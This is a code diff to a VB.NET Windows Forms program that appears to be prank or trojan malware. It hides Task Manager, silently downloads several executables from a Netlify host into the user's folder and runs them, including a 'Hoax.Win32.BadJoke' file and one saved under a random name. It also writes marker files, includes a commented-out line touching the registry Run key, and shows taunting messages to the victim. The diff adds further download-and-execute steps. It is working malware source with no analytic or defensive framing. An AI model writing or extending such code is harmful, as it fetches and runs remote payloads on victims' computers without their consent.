@@ -14,9 +14,10 @@ Public Class Form1
     Dim download1 As Boolean = False
     Dim download2 As Boolean = False
     Dim download3 As Boolean = False
+    Dim download4 As Boolean = False
     Dim working4 As Boolean = False
 
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe
         HideTaskManager()
 
         Try
@@ -68,6 +69,17 @@ Public Class Form1
         End Try
 
         Try
+            download4 = True
+            My.Computer.Network.DownloadFile(
+               "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
+              "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+
+        Catch ex As Exception
+
+        End Try
+
+
+        Try
             download3 = True
             My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
@@ -76,7 +88,22 @@ Public Class Form1
         Catch ex As Exception
 
         End Try
-        Try 'remove... My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
+
+
+        Try
+            download3 = True
+            My.Computer.Network.DownloadFile(
+              "https://incomparable-cascaron-802b94.netlify.app/monitoring-service.exe",
+             "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
+
+        Catch ex As Exception
+
+        End Try
+
+
+
+        Try 'remove... My.Computer.Registry.LocalMachine.OpenSubKey("S
+            'OFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
             Dim fileq As System.IO.StreamWriter
 
             fileq = My.Computer.FileSystem.OpenTextFileWriter("C:\YFShshfgsd.yuki", True)
@@ -105,10 +132,12 @@ Public Class Form1
             admin = False
             If ex.ToString.Contains("denied") Then
                 If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
-
-
-
+                    If Not My.Computer.FileSystem.FileExists("yuki3.exe.config") Then
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
+                    End If
+                    CehckforbadPross.Start()
                 Else
+
                     runasadmin()
                     Me.Close()
                 End If
@@ -127,7 +156,11 @@ Public Class Form1
                     NewYears.Show()
                 End If
                 If day = 1 AndAlso month = 2 Then
-                    Process.Start("https://youtu.be/npjF032TDDQ")
+                    Try
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+                    Catch ex As Exception
+                        MsgBox(ex.ToString, 0 + 16, "ERROR")
+                    End Try
                 End If
                 If day = 10 AndAlso month = 1 Then
                     MsgBox("Your computer is still messed up (:")
@@ -441,6 +474,21 @@ Public Class Form1
                     My.Computer.Network.DownloadFile(
     "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
    "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+
+            End If
+        End If
+
+        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe") Then
+        Else
+            If download1 = True Then
+                Try
+                    My.Computer.Network.DownloadFile(
+    "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
+   "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
                     Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                 Catch ex As Exception
 
